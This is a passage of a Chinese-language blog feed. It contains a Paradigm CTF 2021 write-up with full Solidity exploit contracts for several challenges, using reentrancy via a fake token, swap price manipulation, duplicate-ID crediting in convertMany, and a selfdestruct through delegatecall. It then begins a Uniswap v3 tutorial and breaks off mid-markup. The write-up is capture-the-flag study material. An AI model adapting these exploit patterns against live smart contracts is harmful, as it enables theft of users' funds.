amounts);<br>&#125;<br><br>contract brokerExploit &#123;<br>    uint256 constant DECIMALS = 1 ether;<br>    IUniswapV2Pair pair;<br>    Broker broker;<br>    ERC20Like token;<br>    WETH91 weth;<br>    brokerSetup setup;<br>    Router router = Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);<br><br>    //目标是将rate降为0，然后liquidate<br>    constructor(brokerSetup _setup) payable &#123;<br>        setup = _setup;<br>        weth = setup.weth();<br>        weth.deposit&#123;value: msg.value&#125;();<br>        pair = setup.pair();<br>        broker = setup.broker();<br>        token = ERC20Like(address(setup.token()));<br><br><br>    &#125;<br><br>    function attack() public &#123;<br>        weth.approve(address(broker), type(uint256).max);<br>        weth.approve(address(router), type(uint256).max);<br>        token.approve(address(broker), type(uint256).max);<br>        token.approve(address(router), type(uint256).max);<br><br>        uint256 ethToSend = 15 ether;<br><br>        uint256 balanceBefore = weth.balanceOf(address(this));<br><br><br>        address[] memory path = new address[](2);<br>        path[0] = address(weth);<br>        path[1] = address(token);<br>        uint256[] memory tokensReceived = router.swapExactTokensForTokens(<br>        ethToSend,<br>        1,<br>        path,<br>        address(this),<br>        type(uint256).max<br>        );<br><br><br>        uint256 tokenReceived = tokensReceived[1];<br>        uint256 receivedCollateral = broker.liquidate(address(setup), tokenReceived);<br>        require(weth.balanceOf(address(this)) &gt; balanceBefore);<br>    &#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><h2 id="FARMER"><a href="#FARMER" class="headerlink" title="FARMER"></a>FARMER</h2><p>要求是Dai的余额小于期望值，且farmer和faucet的COMP余额都为0.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function isSolved() public view returns (bool) &#123;<br>    return COMP.balanceOf(address(faucet)) == 0 &amp;&amp;<br>        COMP.balanceOf(address(farmer)) == 0 &amp;&amp;<br>        DAI.balanceOf(address(farmer)) &lt; expectedBalance;<br>&#125;<br></code></pre></td></tr></table></figure><p>期望值expectedBalance的定义</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs solidity">expectedBalance = DAI.balanceOf(address(farmer)) + farmer.peekYield(); <br></code></pre></td></tr></table></figure><p>peekYield其实质是Uniswap中，COMP-&gt;WETH-&gt;DAI的连续两次swap。我们直到SWAP的价格曲线是在 x*y=k 的曲线上移动，故一个简单的思路是在让曲线上的点先向下移动，再进行COMP-&gt;WETH-&gt;DAI的交换，此时能够换到的DAI的数量就会比peekYield的数量少。即<a href="https://medium.com/coinmonks/defi-sandwich-attack-explain-776f6f43b2fd">三明治攻击</a> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function peekYield() public view returns (uint256) &#123;<br>    uint256 claimableAmount = IComptroller(comptroller).claimableComp();<br><br>    address[] memory path = new address[](3);<br>    path[0] = address(COMP);<br>    path[1] = address(WETH);<br>    path[2] = address(dai);<br><br>    uint256[] memory amounts = router.getAmountsOut(claimableAmount, path);<br>    return amounts[2];<br>&#125;<br></code></pre></td></tr></table></figure><p>recycle也是进行COMP-&gt;WETH-&gt;DAI的交换</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function recycle() public returns (uint256) &#123;<br>    address[] memory path = new address[](3);<br>    path[0] = address(COMP);<br>    path[1] = address(WETH);<br>    path[2] = address(dai);<br><br>    uint256 bal = COMP.balanceOf(address(this));<br>    COMP.approve(address(router), bal);<br><br>    uint256[] memory amts = router.swapExactTokensForTokens(<br>        bal,<br>        0,<br>        path,<br>        address(this),<br>        block.timestamp + 1800<br>    );<br><br>    return amts[2];<br>&#125;<br></code></pre></td></tr></table></figure><p>所以有以下攻击合约</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.8.0;<br><br>import &quot;./Setup.sol&quot;;<br><br>contract farmerExploit &#123;<br>    ERC20Like public constant dai = ERC20Like(0x6B175474E89094C44Da98b954EedeAC495271d0F);<br>    UniRouter public constant router = UniRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);<br>    WETH9 public constant WETH = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);<br><br>    ERC20Like public constant COMP = ERC20Like(0xc00e94Cb662C3520282E6f5717214004A7f26888);<br><br>    CompDaiFarmer public farmer;<br>    farmerSetup setup;<br><br>    constructor(farmerSetup _setup) payable &#123;<br>        // 将ETH存入WETH，换成WETH<br>        WETH.deposit&#123;value: msg.value&#125;();<br>        setup = _setup;<br>        farmer = setup.farmer();<br>        WETH.approve(address(farmer), type(uint256).max);<br>        WETH.approve(address(router), type(uint256).max);<br><br>        COMP.approve(address(farmer), type(uint256).max);<br>        COMP.approve(address(router), type(uint256).max);<br><br>        // 将 WETH 通过 uniswap 交换成dai =&gt; 从而向下移动 WETH -&gt; DAI 曲线点<br>        // 事实上交易 Comp -&gt; WETH 对我们来说会更有利可图<br>        // 但我们没有任何 Comp，所以选择 WETH -&gt; DAI<br>        address[] memory path = new address[](2);<br>        path[0] = address(WETH);<br>        path[1] = address(dai);<br><br>        uint256 bal = WETH.balanceOf(address(this));<br><br>        router.swapExactTokensForTokens(<br>            bal, //amountIn<br>            0, //amountOutMin，漏洞点在这里，检查Swap最后得到的Token数量和提供的amountOutMin值的大小关系<br>            path, //path<br>            address(this), //to<br>            block.timestamp //deadline<br>        );<br>        //索赔COMP,使 faucet 的comp数量为0<br>        farmer.claim();<br>        //将COMP交换得到dai,使 farm 的COMP的数量为0，且dai的数量少于expected<br>        farmer.recycle();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="YIELD-AGGREGATOR"><a href="#YIELD-AGGREGATOR" class="headerlink" title="YIELD_AGGREGATOR"></a>YIELD_AGGREGATOR</h2><p>目标是weth余额清零</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function isSolved() public view returns (bool) &#123;<br>    return weth.balanceOf(address(aggregator)) == 0 &amp;&amp;<br>        weth.balanceOf(address(bank)) == 0;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h3><p>这里的 <code>transferFrom</code> 是一个外部调用，可以利用外部调用实现重入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function deposit(Protocol protocol, address[] memory tokens, uint256[] memory amounts) public &#123;<br>    uint256 balanceBefore = protocol.balanceUnderlying();<br>    for (uint256 i= 0; i &lt; tokens.length; i++) &#123;<br>        address token = tokens[i];<br>        uint256 amount = amounts[i];<br><br>        ERC20Like(token).transferFrom(msg.sender, address(this), amount);<br>        ERC20Like(token).approve(address(protocol), 0);<br>        ERC20Like(token).approve(address(protocol), amount);<br>        // reset approval for failed mints<br>        try protocol.mint(amount) &#123; &#125; catch &#123;<br>            ERC20Like(token).approve(address(protocol), 0);<br>        &#125;<br>    &#125;<br>    uint256 balanceAfter = protocol.balanceUnderlying();<br>    uint256 diff = balanceAfter - balanceBefore;<br>    poolTokens[msg.sender] += diff;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><code>deposit</code> 中不会检查输入的protocol和tokens，并且使用balanceBefore和balanceAfter这种快照模式来计算用户存入金额</p><p>利用transferFrom重入有以下流程</p><blockquote><ul><li>deposit fakeToken，数目不限</li><li>balanceUnderlying = 50 （setup后的初始值）</li><li>fakeToken.transferFrom （已重写）<ul><li>deposit weth 50</li><li>weth.transferFrom 50</li><li>balanceUnderlying = 100</li><li>diff = 50</li><li>poolTokens += diff （第一次）</li></ul></li><li>balanceUnderlying = 100</li><li>diff = 50</li><li>poolTokens += diff （第二次）</li></ul></blockquote><p>demo</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract yieldExploit &#123;<br>    yieldSetup setup;<br>    YieldAggregator aggregator;<br>    WETH92 constant weth = WETH92(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);<br>    Protocol protocol;<br>    <br>    constructor(yieldSetup _setup) payable &#123;<br>        require(msg.value == 50 ether);<br>        setup = _setup;<br>        aggregator = setup.aggregator();<br>        protocol = Protocol(address(setup.bank()));<br>        // fund our wallet<br>        weth.deposit&#123;value: msg.value&#125;();<br>        weth.approve(address(aggregator), type(uint256).max);<br>        weth.approve(address(protocol), type(uint256).max);<br>    &#125;<br><br>    function attack() public &#123;<br>        address[] memory _tokens = new address[](1);<br>        _tokens[0] = address(this);<br><br>        uint256[] memory _amounts = new uint256[](1);<br>        _amounts[0] = 100;<br>        aggregator.deposit(protocol, _tokens, _amounts);<br><br>        _tokens[0] = address(weth);<br>        _amounts[0] = 100 ether;<br>        aggregator.withdraw(protocol, _tokens, _amounts);<br>    &#125;<br>    <br>    function transferFrom(<br>        address src,<br>        address dst,<br>        uint256 qty<br>    ) external returns (bool) &#123;<br>        address[] memory _tokens = new address[](1);<br>        _tokens[0] = address(weth);<br><br>        uint256[] memory _amounts = new uint256[](1);<br>        _amounts[0] = 50 ether;<br>        aggregator.deposit(protocol, _tokens, _amounts);<br>        return true;<br>    &#125;<br><br>    function approve(<br>        address dst,<br>        uint256 qty<br>    ) external returns (bool) &#123;<br>        return true;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h3><p>自己生成一个新的bank，deposit weth 50，增加poolTokens[attackContract]的值，再withdraw 原bank 50</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract ExploitYieldAggregator &#123;<br>    WETH92 constant weth = WETH92(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2); // mainnet<br><br>    constructor(address _bank, address _aggregator) payable &#123;<br>        require(msg.value == 50 ether);<br><br>        weth.deposit&#123;value: msg.value&#125;();<br>        weth.approve(_aggregator, type(uint256).max);<br><br>        MiniBank exploitBank = new MiniBank();<br><br>        address[] memory _tokens = new address[](1);<br>        _tokens[0] = address(weth);<br><br>        uint256[] memory _amounts = new uint256[](1);<br>        _amounts[0] = 50 ether;<br><br>        YieldAggregator aggregator = YieldAggregator(_aggregator);<br>        //此处的_amounts必须大于等于50，否则withdraw时poolTokens[attackContract]会不足<br>        aggregator.deposit(Protocol(address(exploitBank)), _tokens, _amounts);<br><br>        _amounts[0] = 50 ether;<br>        aggregator.withdraw(Protocol(_bank), _tokens, _amounts);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="BOUNCER"><a href="#BOUNCER" class="headerlink" title="BOUNCER"></a>BOUNCER</h2><p>要求是清空合约bouncer的余额，初始状态下bouncer余额为50+2 ETH</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function isSolved() public view returns (bool) &#123;<br>    return address(bouncer).balance == 0;<br>&#125;<br></code></pre></td></tr></table></figure><p>只有payout具有transfer功能</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function payout(ERC20Like token, address to, uint256 amount) private &#123;<br>    if (address(token) == ETH) &#123;<br>        payable(to).transfer(amount);<br>    &#125; else &#123;<br>        require(token.transfer(to, amount), &quot;err/not enough tokens&quot;);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>payout被redeem调用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function redeem(ERC20Like token, uint256 amount) public &#123;<br>    tokens[msg.sender][address(token)] -= amount;<br>    payout(token, msg.sender, amount);<br>&#125;<br></code></pre></td></tr></table></figure><p>所以首先要使 <code>tokens[msg.sender][address(token)]</code> 被增加</p><p>convert可以达成需求，但是会在proofOfOwnership中检查msg.value == amount</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">function</span> convert(address who, uint256 id) payable public &#123;<br>    <span class="hljs-meta">Entry</span> memory <span class="hljs-meta">entry</span> = entries[who][id]<span class="hljs-comment">;</span><br>    <span class="hljs-meta">require</span>(block.timestamp != <span class="hljs-meta">entry</span>.timestamp, <span class="hljs-string">&quot;err/wait after entering&quot;</span>)<span class="hljs-comment">;</span><br>    <span class="hljs-meta">if</span> (address(<span class="hljs-meta">entry</span>.token) != ETH) &#123;<br>        <span class="hljs-meta">require</span>(<span class="hljs-meta">entry</span>.token.allowance(who, address(this)) == type(uint256).max, <span class="hljs-string">&quot;err/must give full approval&quot;</span>)<span class="hljs-comment">;</span><br>    &#125;<br>    <span class="hljs-meta">require</span>(msg.sender == who <span class="hljs-title">||</span> msg.sender == delegates[who])<span class="hljs-comment">;</span><br>    proofOfOwnership(<span class="hljs-meta">entry</span>.token, who, <span class="hljs-meta">entry</span>.amount)<span class="hljs-comment">;</span><br>    tokens[who][address(<span class="hljs-meta">entry</span>.token)] += <span class="hljs-meta">entry</span>.amount<span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>所以选择利用convertMany，支付1份value而使 <code>tokens[who][address(entry.token)]</code> n倍的增加</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function convertMany(address who, uint256[] memory ids) payable public &#123;<br>    for (uint256 i = 0; i &lt; ids.length; i++) &#123;<br>        convert(who, ids[i]);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>demo</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.8.0;<br><br>import &quot;./Setup.sol&quot;;<br><br>contract bouncerExploit &#123;<br><br>    address constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;<br>    uint256 public constant entryFee = 1 ether;<br>    Bouncer bouncer;<br><br>    function attack1(address _bouncer) public payable &#123;<br>        bouncer = Bouncer(_bouncer);<br>        require(msg.value == entryFee);<br><br>        uint256 amount = entryFee + address(bouncer).balance;<br>        bouncer.enter&#123;value: entryFee&#125;(ETH, amount);<br>        //此时address(bouncer).balance=52+1<br>    &#125;<br><br>    function attack2() public payable &#123;<br>    //amount=53<br>        uint256 amount = address(bouncer).balance;<br>        require(msg.value == amount);<br><br>        uint256[] memory ids = new uint256[](2);<br>        ids[0] = 0;<br>        ids[1] = 0;<br><br>        bouncer.convertMany&#123;value: amount&#125;(address(this), ids);<br>        //利用convertMany，使<br>        //address(bouncer).balance=106<br>        //tokens[address(exploit)][address(ETH)]=106<br>        bouncer.redeem(ERC20Like(ETH), address(bouncer).balance);<br>    &#125;<br><br>    receive() external payable &#123;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="BABYSANDBOX"><a href="#BABYSANDBOX" class="headerlink" title="BABYSANDBOX"></a>BABYSANDBOX</h2><p>要求部署的BabySandbox合约的代码大小变为 0 ，即销毁他</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function isSolved() public view returns (bool) &#123;<br>    uint size;<br>    assembly &#123;<br>        size := extcodesize(sload(sandbox.slot))<br>    &#125;<br>    return size == 0;<br>&#125;<br></code></pre></td></tr></table></figure><p><a href="https://www.evm.codes/#fa">staticcall</a> 意思是等同于<em>CALL</em>，除了它不允许任何状态修改指令。因此 <em>SELFDESTRUCT</em> 不允许在 <em>staticcall</em> 期间使用</p><p>BabySandbox.run()的内部逻辑</p><ul><li><p>首先会判断<code>msg.sender == address(this)</code>，即判断是否为合约自身调用。由于我们将会外部调用该合约，故此时的<code>msg.sender</code>是code合约地址，判断为否。</p></li><li><p>然后进入<code>staticcall(address(this))</code>部分，它重进入自己的合约内，再次调用<code>babysandbox.run(code)</code>方法。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs solidity">if iszero(staticcall(0x4000, address(), 0, calldatasize(), 0, 0)) &#123;<br>    revert(0x00, 0x00)<br>&#125;<br></code></pre></td></tr></table></figure><p>此时需注意，由于是重进入，故此时的<code>msg.sender</code>与<code>address(this)</code>相等。故经过判定，会进入到<code>delegatecall(code)</code>的逻辑中。</p><ul><li><p>在<code>delegatecall(code)</code>逻辑中，实际上是调用外部合约code的<code>fallback()</code>方法，注意此时为<code>staticcall</code>的调用环境，故此时应该让其直接返回<code>success</code>即可。</p></li><li><p>并且此时在staticcall环境中，不允许修改状态</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs solidity">switch delegatecall(gas(), code, 0x00, 0x00, 0x00, 0x00)<br></code></pre></td></tr></table></figure></li></ul></li><li><p><code>staticcall(address(this))</code>通过后，会进入<code>call(address(this))</code>调用，同样的参数，同样的逻辑过程。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs solidity">switch call(0x4000, address(), 0, 0, calldatasize(), 0, 0)<br></code></pre></td></tr></table></figure><ul><li><p>重进入自己的合约内，再次调用<code>babysandbox.run(code)</code>方法，进入到<code>delegatecall(code)</code>的逻辑中</p></li><li><p>在<code>delegatecall(code)</code>逻辑中，调用外部合约code的<code>fallback()</code>方法</p><p>因此此时需要在<code>code.fallback()</code>函数中，不直接返回，而是执行<code>selfdestruct(tx.origin)</code>来销毁babysandbox合约。</p><p>注意，由于<a href="https://learnblockchain.cn/article/4310#%E6%89%A7%E8%A1%8C%E4%B8%8A%E4%B8%8B%E6%96%87">delegatecall</a>不会改变上下文，所以msg.sender和tx.origin都可以使用</p></li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs solidity">import &quot;./Setup.sol&quot;;<br><br>contract Child &#123;<br>    Child private immutable self = this;<br>    uint8 flag = 1;<br><br>    //试图修改状态，判断是否在staticcall环境中<br>    function check() external &#123;<br>        flag += 1;<br>    &#125;<br><br>    fallback() external payable &#123;<br>        //如果修改状态成功，则说明不在staticcall环境中，可以进行selfdestruct<br>        try self.check() &#123;<br>            selfdestruct(tx.origin);<br>        &#125; catch &#123;&#125;<br>        //由于staticcall环境中不能修改状态，因此以下方法不能实现<br>//        bool flag = false;<br>//        if(flag) &#123;<br>//            selfdestruct(tx.origin);<br>//        &#125;else&#123;<br>//            flag = true;<br>//        &#125;<br>    &#125;<br>&#125;<br><br>contract babySandboxExploit &#123;<br>    constructor(babySandboxSetup setup) &#123;<br>        setup.sandbox().run(address(new Child()));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt; &lt;a href=&quot;https://ctf.paradigm.xyz/&quot;&gt;Paradigm CTF 2021&lt;/a&gt;&lt;/p&gt;
&lt;p&gt; &lt;a href=&quot;https://github.com/paradigmxyz/paradigm-ctf-2021&quot;&gt;Paradigm CT</summary>
      
    
    
    
    
    <category term="靶场刷题" scheme="http://example.com/tags/%E9%9D%B6%E5%9C%BA%E5%88%B7%E9%A2%98/"/>
    
    <category term="Etherum" scheme="http://example.com/tags/Etherum/"/>
    
  </entry>
  
  <entry>
    <title>Uniswap Part Ⅱ | 提供/移除流动性</title>
    <link href="http://example.com/2022/08/20/uniswap-v3-2/"/>
    <id>http://example.com/2022/08/20/uniswap-v3-2/</id>
    <published>2022-08-20T12:19:38.000Z</published>
    <updated>2022-09-18T08:20:20.291Z</updated>
    
    <content type="html"><![CDATA[<h1 id="提供流动性"><a href="#提供流动性" class="headerlink" title="提供流动性"></a>提供流动性</h1><p>在合约内，v3 会保存所有用户的流动性，代码内称作 <code>Position</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sequence">User-&gt;NonfungiblePositionManager:mint<br>NonfungiblePositionManager-&gt;NonfungiblePositionManager:addLiquidity<br>NonfungiblePositionManager-&gt;UniswapV3Pool:mint<br>UniswapV3Pool-&gt;UniswapV3Pool:_modifyPosition<br>UniswapV3Pool-&gt;UniswapV3Pool:_updatePosition<br></code></pre></td></tr></table></figure><p><code>NonfungiblePositionManager</code>的mint函数实现初始的流动性的添加。<code>increaseLiquidity</code>函数实现了流动性的增加。这两个函数的逻辑基本一致，都是通过调用<code>addLiquidity</code>函数实现。mint需要额外创建ERC721的token。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span 